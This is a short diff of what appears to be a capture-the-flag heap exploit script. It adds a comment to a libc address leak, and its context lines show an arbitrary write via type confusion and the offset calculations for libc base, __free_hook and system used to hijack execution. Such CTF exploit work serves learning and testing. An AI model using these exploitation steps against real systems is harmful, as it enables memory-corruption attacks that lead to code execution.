@@ -61,7 +61,7 @@ editType(1, ptr)                            # modify ptr
 delType(1, TYPE_INIT)                       # type none, ptr uninitialized
 editType(1, p64(unsorted) + "\x10\x00")     # assign string, arbirary write
 
-libc = u64(viewType(2)[:8])
+libc = u64(viewType(2)[:8])                 # leak unsorted bin address
 libc_base = libc - 0x3c4b78
 free_hook = libc_base + 0x3c67a8
 system = libc_base + 0x45390
